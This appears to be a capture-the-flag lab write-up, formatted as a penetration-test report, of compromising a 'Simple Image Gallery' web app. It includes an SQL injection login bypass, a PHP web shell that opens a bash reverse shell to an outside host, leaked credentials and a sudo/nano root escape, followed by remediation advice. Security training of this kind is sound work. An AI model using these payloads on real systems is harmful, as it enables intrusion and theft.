1. Executive Summary
A comprehensive penetration test was conducted on a target machine hosting a "Simple Image Gallery" web application. The assessment revealed critical vulnerabilities, including an SQL Injection authentication bypass and insecure file upload mechanisms, leading to initial access. Further enumeration led to the discovery of plaintext database credentials. Privilege escalation was possible by leveraging a user's bash history and a misconfigured sudo permission, ultimately granting full root access to the system. This report documents the methodology, findings, and recommendations.

2. Reconnaissance & Enumeration
The engagement began with service enumeration using Nmap to identify open ports and running services.

Command Executed:

bash
nmap -sC -sV 10.201.34.93
Findings:

text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-title: Simple Image Gallery System
|_http-server-header: Apache/2.4.41 (Ubuntu)
Analysis: Three services were identified. While port 80 hosted a default Apache page, port 8080 was running the "Simple Image Gallery System" CMS, which was selected as the primary attack vector.

3. Initial Foothold: Web Application Exploitation
3.1. Authentication Bypass via SQL Injection
The login form on the application was tested for SQL Injection vulnerabilities.

Payload Used:
In the username field: ' OR 1=1 -- -

Result: The payload successfully bypassed authentication, granting access to the administrative dashboard.

3.2. Gaining Remote Code Execution (RCE)
To establish a persistent foothold, a PHP web shell was uploaded to the server. A reverse shell script was created to connect back to my listener.

Contents of shell.php:

php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.201.85.239/1234 0>&1'");
?>
Listener Started on AttackBox:

bash
nc -lvnp 1234
The shell was activated by navigating to http://10.201.34.93:8080/gallery/shell.php in the browser. A connection was received, and an interactive shell was upgraded using:

bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
Result: Access was gained as the www-data user.

4. Post-Exploitation & Lateral Movement
4.1. Database Credential Discovery
File system enumeration revealed a configuration file containing database credentials.

File Analyzed: /var/www/html/gallery/initialize.php

Credentials Found:

Username: gallery_user

Password: passw0rd321

Database: gallery_db

4.2. Database Interaction
These credentials were used to interact with the MySQL database directly from the shell.

Command Executed:

bash
mysql -u gallery_user -p gallery_db
SQL Query:

sql
SELECT * FROM users;
Database Output:

text
+----+--------------+----------+----------+----------------------------------+------------------------------+
| id | firstname    | lastname | username | password                         | avatar                       |
+----+--------------+----------+----------+----------------------------------+------------------------------+
|  1 | Adminstrator | Admin    | admin    | 73d999b4978d1780b23cd63495b81bcc | uploads/1757022240_shell.php |
+----+--------------+----------+----------+----------------------------------+------------------------------+
Analysis: The database contained an administrative user with a password hash and a reference to an uploaded PHP shell, confirming the initial attack path.

5. Privilege Escalation to User mike
Attempts to switch to the user mike were initially unsuccessful with the database password. The user's .bash_history file was inspected and found to contain a cleartext password.

Command Executed:

bash
cat /home/mike/.bash_history
Password Found: b3stpassw0rdbr0xx

This password was used to switch to the mike user and retrieve the user flag.

Commands Executed:

bash
su mike
 Password: b3stpassw0rdbr0xx
cat /home/mike/user.txt
User Flag: THM{af05cd30bfed67849efd546ef}

6. Privilege Escalation to Root
The sudo permissions for user mike were checked, revealing a critical misconfiguration.

Command Executed:

bash
sudo -l
Output:

text
User mike may run the following commands on ip-10-201-34-93:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
The /opt/rootkit.sh script was analyzed:

Contents of /opt/rootkit.sh:

bash
#!/bin/bash
read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
The script's read option executed the nano text editor as root. Following the GTFOBins methodology for nano, a root shell was spawned.

Exploitation Steps:

Command: sudo /bin/bash /opt/rootkit.sh

Option Selected: read (This opens /root/report.txt in nano as root)

In Nano:

Pressed Ctrl+R (Read File)

Pressed Ctrl+X (Exit prompt)

Entered the command: reset; sh 1>&0 2>&0

Pressed Enter

Result: A root shell was successfully spawned.

Root Flag Retrieval:

bash
cat /root/root.txt
Root Flag: THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}

7. Conclusion & Recommendations
7.1. Summary of Vulnerabilities

SQL Injection (CWE-89): In the login form, allowing authentication bypass.

Unrestricted File Upload (CWE-434): Allowing the upload and execution of a malicious PHP shell.

Cleartext Storage of Sensitive Information (CWE-312): Database credentials stored in a plaintext PHP file.

Incorrect Privilege Assignment (CWE-266): The sudo configuration allowed a user to run a script as root without a password, which contained an editor (nano) that could be exploited to break out into a shell.

7.2. Remediation Strategies

Input Validation: Use parameterized queries (prepared statements) to prevent SQL Injection.

File Upload Hardening: Implement strict whitelists for allowed file extensions, store uploaded files outside the web root, or use a dedicated storage solution.

Secrets Management: Remove hardcoded credentials from source code. Utilize environment variables or a secure secrets management vault.

Principle of Least Privilege: Audit and tighten sudo permissions. Avoid granting NOPASSWD access to commands that can spawn shells or editors. Replace interactive editors like nano with non-interactive commands in scripts where possible.

This test demonstrates how a chain of vulnerabilities can be exploited to compromise a system fully. Addressing any single link in this chain would have significantly increased the difficulty of the attack.
